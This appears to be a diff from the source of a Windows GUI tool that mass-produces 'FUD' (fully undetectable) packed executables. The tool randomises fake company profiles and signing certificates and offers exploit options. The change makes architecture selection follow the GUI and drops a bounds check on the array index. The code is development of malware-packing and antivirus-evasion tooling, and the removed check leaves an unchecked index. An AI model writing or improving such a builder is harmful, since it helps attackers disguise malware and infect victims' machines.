@@ -2312,10 +2312,13 @@ static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
     int totalCount = *(int*)lpParam;
     
     for (int i = 0; i < totalCount && g_massGenerationActive; ++i) {
-        // Randomize company, cert, and architecture for each generation
+        // Use GUI selections as base, but randomize company/cert for variety
+        int baseArchIndex = (int)SendMessage(g_hArchCombo, CB_GETCURSEL, 0, 0);
+        if (baseArchIndex == CB_ERR) baseArchIndex = 0; // Default to x64
+        
         int companyIndex = g_packer.randomEngine.generateRandomDWORD() % g_packer.getCompanyProfiles().size();
         int certIndex = g_packer.getSafeRandomCertIndex(companyIndex); // Use safe certificate selection
-        int archIndex = 1; // Force x64 architecture for better compatibility
+        int archIndex = baseArchIndex; // Use architecture from GUI
         
         auto architectures = g_packer.getArchitectures();
         MultiArchitectureSupport::Architecture architecture = architectures[archIndex].first;
@@ -2493,11 +2496,8 @@ static void createFUDExecutable() {
     if (companyIndex == CB_ERR) companyIndex = 0;
     if (certIndex == CB_ERR) certIndex = 0;
     
-    MultiArchitectureSupport::Architecture architecture = MultiArchitectureSupport::Architecture::x64;
     auto architectures = g_packer.getArchitectures();
-    if (archIndex >= 0 && archIndex < static_cast<int>(architectures.size())) {
-        architecture = architectures[archIndex].first;
-    }
+    MultiArchitectureSupport::Architecture architecture = architectures[archIndex].first;
     
     std::wstring statusMsg = L"Creating FUD packed executable";
     if (exploitType != EXPLOIT_NONE) {
